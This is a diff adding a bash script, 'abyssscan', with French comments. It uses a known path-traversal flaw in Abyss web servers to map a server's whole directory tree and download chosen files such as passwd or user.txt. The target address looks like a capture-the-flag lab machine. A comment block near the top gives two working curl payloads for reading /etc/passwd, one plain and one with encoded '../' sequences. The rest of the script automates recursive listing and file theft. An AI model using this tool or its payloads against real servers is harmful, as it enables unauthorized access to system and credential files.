@@ -1,0 +1,176 @@
+#!/bin/bash
+readonly VERSION="0.8"
+<<INTRO
+	Parcours un serveur tournant sous le système abyss afin d'en dévoiler l'arborescence
+	cpin @ 2019
+	bash script, kali linux
+INTRO
+
+<<AMELOIORATIONS
+	Idées d'améliorations:
+	- [DONE]adresse:port en argument de ligne de commande (abyssscan <addr>:<port> [options])
+	- [DONE]option ignorer certains dossiers (-i <dossier1,dossier2,...> par exemple)
+	- Option pour enregistrer des fichiers spécifiques en fonction de leur nom (ex: user.txt)
+AMELOIORATIONS
+
+<<VULN
+	2 façons d'exploiter la vulnérabilité du serveur Abyss
+	 - curl -X GET http://10.10.10.148:9999//etc/passwd
+	 - curl -X GET "http://10.10.10.148:9999/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd"
+	curl -X GET http://10.10.10.148:9999//etc | grep -o "\">.*</a>" | sed 's/<\/a>//;s/">//'
+VULN
+
+function getVersion(){
+	echo "abyssscan v$VERSION"
+}
+function help(){
+	echo "************  Abyssscan - cpin - 2019  ************"
+	echo "Scan l'arborescence d'un serveur grace a une"
+	echo "vulnérabilité connue des serveurs Abyss"
+	echo ""
+	echo "Usage: abyssscan <url>:<port> [OPTIONS]"
+	echo "ou: abyssscan -h/--help"
+	echo "ou: abyssscan -v/--version"
+	echo ""
+	echo "OPTIONS:"
+	echo "-i <liste> : Liste de noms de dossiers à ignorer lors du scan. Ces dossiers doivent être renseignés sous la forme doss1,doss2,doss3,..."
+	echo "-d <dossier> : scan depuis le dossier spécifique plutôt que depuit root \"/\""
+	echo "-s <fichier> : télécharge le contenu du fichier (ou des fichiers) (ex: user.txt,user,passwd)"
+	echo "-h, --help : Affiche cette page d'aide et quitte le programme."
+	echo "-v, --version : Affiche la version actuelle de ce programme."
+	echo "************  Abyssscan - cpin - 2019  ************"
+}
+
+
+if [ $# == 0 ]; then
+    	help
+    	exit 1
+fi
+
+if [[ $1 == "-h" || $1 == "--help" ]]; then
+	help
+	exit 0
+fi
+
+if [[ $1 == "-v" || $1 == "--version" ]]; then
+	getVersion
+	exit 0
+fi
+
+
+ignore="" #default, pas de dossier ignoré
+url=$1; shift
+racine="/"
+fichiersDL=""
+
+options=$(getopt -l "help,version" -o "hi:d:vs:" -- "$@")
+eval set -- "$options"
+#gestion des arguments en ligne de commande
+while true; 
+do
+  	case "$1" in
+		-h | --help)
+			help
+			exit 0
+		;;
+	    	-i) 
+			fieldSep=$IFS
+			IFS=","
+			#ignore="$2"; shift 2
+			for doss in $2;
+			do
+				doss=`echo $doss | sed -e 's/^[[:space:]]*//'`
+				if !(echo $doss | grep -q ".*/")
+				then
+					ignore=$ignore$doss"/ "
+				else
+					ignore=$ignore$doss" "
+				fi
+			done
+			IFS=$fieldSep
+			shift 2
+		;;
+		-s)
+			fieldSep=$IFS
+			IFS=","
+			for fich in $2;
+			do
+				fich=`echo $fich | sed -e 's/^[[:space:]]*//'`
+				fichiersDL=$fichiersDL$fich" "
+			done
+			IFS=$fieldSep
+			shift 2
+		;;
+		-d)
+			racine="$2"; shift 2
+		;;
+		-v | --version)
+			getVersion
+			exit 0
+		;;
+		--)
+			shift
+			break
+		;;
+		*)
+			echo "Option non valide : $1"
+			echo "Voir abyssscan --help"
+			exit 1
+		;;
+	  esac
+done
+
+
+#Prend un dossier en entrée et renvoie son contenu sous forme de liste. 1 élément par ligne
+function List(){
+	#curl -sS -X GET http://10.10.10.148:9999/$1 | grep -o "\">.*</a>" | sed 's/<\/a>//;s/">//'
+	curl -sS -X GET $url/$1 | grep -o "\">.*</a>" | sed 's/<\/a>//;s/">//'
+}
+
+function dlFile(){
+	curl -sS -X GET $url/$1 > $2
+	echo "$url/$1 téléchargé."
+}
+
+function Parcours(){
+	local liste=$(List $1)
+	local profondeur=$2
+	local debutligne=""
+	for i in $(seq $profondeur);
+	do 
+		debutligne=$debutligne"| "
+	done
+	
+	for item in $liste;
+	do
+		local chemin=$1$item			
+		echo "$debutligne$item"
+		if (echo $item | grep -q ".*/$")
+		then
+			#On vérifie les dossiers à ignorer
+			local next=0
+			for dossIgnore in $ignore;
+			do
+				if [ $dossIgnore == $item ]; then
+					next=1
+				fi
+			done
+			if [ $next -eq 0 ]; then
+				Parcours $chemin $((profondeur+1))
+			fi
+		else
+			for dlFile in $fichiersDL;
+			do
+				if [ $dlFile == $item ]; then
+					echo $chemin
+					dlFile $chemin $dlFile
+				fi
+			done
+		fi	
+	done
+}
+
+echo $racine
+Parcours $racine 1
+
+
